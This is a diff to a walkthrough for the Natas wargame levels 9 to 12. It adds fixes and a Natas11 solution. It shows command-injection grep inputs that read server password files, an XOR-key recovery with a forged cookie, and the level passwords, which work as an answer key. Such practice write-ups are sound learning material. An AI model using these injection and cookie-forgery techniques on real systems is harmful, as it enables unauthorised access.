@@ -43,11 +43,17 @@ secret = oubWYf2kBq
 **pass: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl**  
 ## Natas9
 Query: `'' -m10  /etc/natas_webpass/natas10`  
-**user: natas10**
+**user: natas10**  
 **pass: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**
 ## Natas10
 Query: `'' -m10  /etc/natas_webpass/natas11`  
-**user: natas11*  
+**user: natas11**  
 **pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK**
 ## Natas11
+https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Base64','string':'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%253D'%7D,'Standard',false)&input=eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0  
+Xor key: qw8J
+Crafted cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK  
+**user: natas12**
+**pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**
+## Natas12
 
